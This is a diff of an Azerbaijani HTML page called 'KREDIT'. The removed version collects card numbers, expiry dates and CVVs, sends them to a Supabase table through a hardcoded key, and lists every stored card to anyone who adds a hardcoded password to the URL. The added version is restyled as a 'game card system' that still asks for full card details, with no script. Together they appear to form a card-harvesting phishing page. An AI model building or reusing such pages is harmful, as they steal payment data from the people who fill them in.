@@ -1,236 +1,160 @@
 <!DOCTYPE html>
-<html>
+<html lang="az">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>KREDIT Kartı</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>KREDIT | Oyun Sistemi</title>
 
 <style>
-body {
-  margin: 0;
-  font-family: Arial, sans-serif;
-  background: linear-gradient(135deg, #00c6ff, #0072ff);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-  color: white;
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: 'Segoe UI', sans-serif;
 }
 
-.container {
-  width: 90%;
-  max-width: 400px;
+body{
+  min-height:100vh;
+  background: linear-gradient(-45deg, #0f2027, #203a43, #2c5364, #1e3c72);
+  background-size:400% 400%;
+  animation: gradientBG 12s ease infinite;
+  color:white;
+  overflow-x:hidden;
 }
 
-.card {
-  width: 100%;
-  height: 200px;
-  perspective: 1000px;
-  margin-bottom: 20px;
+@keyframes gradientBG{
+  0%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+  100%{background-position:0% 50%}
 }
 
-.card-inner {
-  width: 100%;
-  height: 100%;
-  position: relative;
-  transition: transform 0.6s;
-  transform-style: preserve-3d;
+header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:20px 8%;
 }
 
-.card.flipped .card-inner {
-  transform: rotateY(180deg);
+.logo{
+  font-size:22px;
+  font-weight:700;
+  letter-spacing:2px;
 }
 
-.card-front, .card-back {
-  position: absolute;
-  width: 100%;
-  height: 100%;
-  border-radius: 20px;
-  padding: 20px;
-  box-sizing: border-box;
-  backface-visibility: hidden;
+.hero{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:60px 8%;
+  flex-wrap:wrap;
 }
 
-.card-front {
-  background: linear-gradient(135deg, #005bea, #00c6fb);
+.hero-left{
+  max-width:500px;
 }
 
-.card-back {
-  background: linear-gradient(135deg, #003973, #005bea);
-  transform: rotateY(180deg);
+.hero-left h1{
+  font-size:48px;
+  margin-bottom:20px;
 }
 
-.card-title {
-  font-weight: bold;
-  font-size: 18px;
-  letter-spacing: 2px;
+.hero-left p{
+  font-size:18px;
+  opacity:0.8;
+  margin-bottom:30px;
 }
 
-.card-number {
-  margin-top: 50px;
-  font-size: 18px;
-  letter-spacing: 2px;
+.card-box{
+  background: rgba(255,255,255,0.08);
+  backdrop-filter: blur(15px);
+  padding:25px;
+  border-radius:20px;
+  width:320px;
+  box-shadow:0 20px 40px rgba(0,0,0,0.4);
+  animation: floatCard 4s ease-in-out infinite;
 }
 
-.card-info {
-  display: flex;
-  justify-content: space-between;
-  margin-top: 20px;
-  font-size: 14px;
+@keyframes floatCard{
+  0%{transform:translateY(0px)}
+  50%{transform:translateY(-15px)}
+  100%{transform:translateY(0px)}
 }
 
-.cvv-box {
-  margin-top: 70px;
-  text-align: right;
-  font-size: 18px;
+.card-box h3{
+  margin-bottom:15px;
+  font-weight:500;
 }
 
-input {
-  width: 100%;
-  padding: 12px;
-  margin-bottom: 10px;
-  border-radius: 10px;
-  border: none;
-  font-size: 14px;
+input{
+  width:100%;
+  padding:12px;
+  margin-bottom:12px;
+  border:none;
+  border-radius:10px;
+  outline:none;
 }
 
-button {
-  width: 100%;
-  padding: 12px;
-  border-radius: 10px;
-  border: none;
-  background: white;
-  color: #0072ff;
-  font-weight: bold;
-  cursor: pointer;
+.row{
+  display:flex;
+  gap:10px;
+}
+
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:10px;
+  background:#00c6ff;
+  color:white;
+  font-weight:bold;
+  cursor:pointer;
+  transition:0.3s;
+}
+
+button:hover{
+  background:#0072ff;
+}
+
+@media(max-width:900px){
+  .hero{
+    flex-direction:column;
+    text-align:center;
+  }
+
+  .card-box{
+    margin-top:40px;
+  }
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
+<header>
+  <div class="logo">KREDIT</div>
+</header>
 
-<div class="card" id="card">
-  <div class="card-inner">
+<section class="hero">
 
-    <div class="card-front">
-      <div class="card-title">KREDIT</div>
-      <div class="card-number" id="displayNumber">**** **** **** ****</div>
-      <div class="card-info">
-        <span id="displayExpiry">MM/YY</span>
-      </div>
-    </div>
-
-    <div class="card-back">
-      <div class="cvv-box">
-        CVV: <span id="displayCVV">***</span>
-      </div>
-    </div>
-
+  <div class="hero-left">
+    <h1>Yeni Nəsil Oyun Kart Sistemi</h1>
+    <p>Oyun kart nömrəsini daxil edin və sistemə qoşulun. Təhlükəsiz və sürətli.</p>
   </div>
-</div>
 
-<input type="text" id="cardNumber" placeholder="16 rəqəm" maxlength="19">
-<input type="text" id="expiry" placeholder="MMYY" maxlength="4">
-<input type="text" id="cvv" placeholder="3 rəqəm" maxlength="3">
+  <div class="card-box">
+    <h3>Oyun Kart Məlumatı</h3>
 
-<button onclick="submitCard()">Göndər</button>
-<p id="status"></p>
+    <input type="text" placeholder="Kart üzərindəki 16 rəqəm">
 
-</div>
+    <div class="row">
+      <input type="text" placeholder="MM/YY">
+      <input type="text" placeholder="CVV">
+    </div>
 
-<script type="module">
-import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
+    <button>Daxil Et</button>
+  </div>
 
-const supabaseUrl = "https://gkrfcoyleewxrxbfdunq.supabase.co";
-const supabaseKey = "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH";
-const supabase = createClient(supabaseUrl, supabaseKey);
-
-const adminPassword = "service.2000";
-const card = document.getElementById("card");
-
-const numberInput = document.getElementById("cardNumber");
-const expiryInput = document.getElementById("expiry");
-const cvvInput = document.getElementById("cvv");
-
-numberInput.addEventListener("input", () => {
-  let value = numberInput.value.replace(/\D/g, "").substring(0,16);
-  value = value.replace(/(.{4})/g, "$1 ").trim();
-  document.getElementById("displayNumber").innerText =
-    value || "**** **** **** ****";
-});
-
-expiryInput.addEventListener("input", () => {
-  let value = expiryInput.value.replace(/\D/g, "").substring(0,4);
-  if (value.length >= 3) {
-    value = value.substring(0,2) + "/" + value.substring(2);
-  }
-  document.getElementById("displayExpiry").innerText =
-    value || "MM/YY";
-});
-
-cvvInput.addEventListener("focus", () => {
-  card.classList.add("flipped");
-});
-
-cvvInput.addEventListener("blur", () => {
-  card.classList.remove("flipped");
-});
-
-cvvInput.addEventListener("input", () => {
-  let value = cvvInput.value.replace(/\D/g, "").substring(0,3);
-  document.getElementById("displayCVV").innerText =
-    value || "***";
-});
-
-window.submitCard = async function() {
-  const cardNumber = numberInput.value.replace(/\s/g,"");
-  const expiry = expiryInput.value;
-  const cvv = cvvInput.value;
-
-  if (cardNumber.length !== 16 || expiry.length !== 4 || cvv.length !== 3) {
-    document.getElementById("status").innerText =
-      "Məlumatları düzgün daxil edin!";
-    return;
-  }
-
-  await supabase.from("messages").insert([{
-    name: cardNumber,
-    message: "Expiry: " + expiry + " | CVV: " + cvv
-  }]);
-
-  document.getElementById("status").innerText = "Kart əlavə edildi!";
-};
-
-// Admin
-const urlParams = new URLSearchParams(window.location.search);
-if (urlParams.get("kod") === adminPassword) {
-  loadCards();
-}
-
-async function loadCards() {
-  const { data } = await supabase
-    .from("messages")
-    .select("*")
-    .order("id", { ascending: false });
-
-  const container = document.createElement("div");
-  container.style.marginTop = "20px";
-
-  data.forEach(card => {
-    const div = document.createElement("div");
-    div.style.background = "#004aad";
-    div.style.padding = "10px";
-    div.style.marginTop = "10px";
-    div.style.borderRadius = "10px";
-    div.innerText = card.name + " | " + card.message;
-    container.appendChild(div);
-  });
-
-  document.body.appendChild(container);
-}
-</script>
+</section>
 
 </body>
 </html>
